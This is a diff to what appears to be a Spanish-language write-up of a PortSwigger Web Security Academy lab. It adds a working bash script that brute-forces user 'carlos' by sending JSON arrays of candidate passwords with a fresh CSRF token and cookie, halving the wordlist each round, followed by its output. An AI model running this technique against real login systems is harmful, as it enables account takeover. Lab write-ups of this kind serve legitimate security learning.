@@ -451,6 +451,64 @@ curl $URL -d $DATA -b $COOKIE
 Lo curioso es que no recibimos ningun output, lo cual parece ser muy misterioso. Intentaremos dividir en 2 partes el string para de esa manera verificar si esto ocurre cuando enviamos muchos argumentos o algo esta ocurriendo por detrás que nos puede dar una pista de que hacer.
 
 ```bash
+#!/bin/bash
+
+URL='https://acd41fb21eba1524804c04b7006700ef.web-security-academy.net/login'
+NULL='/dev/null'
+
+USER="carlos"
+
+cp password.txt pass0.txt #Comentar la segunda vez que corres el script
+
+for i in `seq 1 7`
+do
+    
+    REQUEST1=`curl $URL -D- -s`
+    CSRF=`echo $REQUEST1 | grep -oP 'value=".*?"' | cut -d '"' -f 2`
+    COOKIE=`echo $REQUEST1 | grep -oP 'session=.*?;'`
+
+    LINESS=`cat pass0.txt | wc -l`
+
+    sed -n 1,$[$LINESS/2]p pass0.txt > pass1.txt
+    sed -n $[$LINESS/2+1],$[$LINESS]p pass0.txt > pass2.txt
+
+    PASS1=`cat pass1.txt | tr '\n' ':' | sed s/':'/'","'/g`
+    PASS2=`cat pass2.txt | tr '\n' ':' | sed s/':'/'","'/g`
+
+    DATA='{"csrf":"'$CSRF'","username":"'$USER'","password":["'${PASS1::-3}'"]}'
+    RESULT1=`curl $URL -d $DATA -b $COOKIE -s`
+    #echo "Resultado uno"
+    #echo $RESULT1
+    
+    REQUEST1=`curl $URL -D- -s`
+    CSRF=`echo $REQUEST1 | grep -oP 'value=".*?"' | cut -d '"' -f 2`
+    COOKIE=`echo $REQUEST1 | grep -oP 'session=.*?;'`
+    
+    DATA='{"csrf":"'$CSRF'","username":"'$USER'","password":["'${PASS2::-3}'"]}'
+    RESULT2=`curl $URL -d $DATA -b $COOKIE -s`
+    #echo "Resultado dos"
+    #echo $RESULT2
+    
+    if echo $RESULT1 | grep -o "Invalid username or password" > $NULL
+    then
+            #echo "Aqui en pass1.txt no es"
+            echo "La clave debe estar en: ${PASS2::-3}"
+            cat pass2.txt > pass0.txt
+    fi
+
+    if echo $RESULT2 | grep -o "Invalid username or password" > $NULL
+    then
+            #echo "Aqui en pass2.txt no es"
+            echo "La clave debe estar en: ${PASS1::-3}"
+            cat pass1.txt > pass0.txt
+    fi
+    sleep 1
+done
+```
+
+Ejecutando el codigo vemos lo siguiente.
+
+```bash
 $ bash enum-user6.sh 
 
 La clave debe estar en: thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor","monitoring","montana","moon","moscow
